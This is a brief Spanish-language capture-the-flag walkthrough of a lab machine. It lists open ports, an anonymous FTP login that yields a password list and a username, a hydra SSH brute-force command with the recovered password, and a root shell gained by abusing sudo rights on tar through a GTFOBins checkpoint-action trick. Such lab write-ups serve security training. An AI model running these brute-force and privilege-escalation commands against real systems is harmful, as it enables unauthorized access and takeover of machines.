PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http


-Nos autenticamos por ftp con el usuario Anonymous

-Nos decargamos los ficheros locks.txt y task.txt

-El fichero locks.txt contiene una lista de contraseñas y el fichero task.txt sale el usuario lin

-Hacemos un ataque de fuerza bruta al usuario lin con las contraseña de locks.txt
	hydra 10.10.72.226 ssh -l lin -P locks.txt -vV
	password: RedDr4gonSynd1cat3

-Nos autenticamos por ssh con el usuario lin y la contraseña obtenida:
	ssh lin@10.10.72.226
	password: RedDr4gonSynd1cat3

## Escalada de Privilegios

-sudo -l:
	(root) /bin/tar

-Abusamos de binario /bin/tar buscando en gtfobins:
	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
	# whoami
	root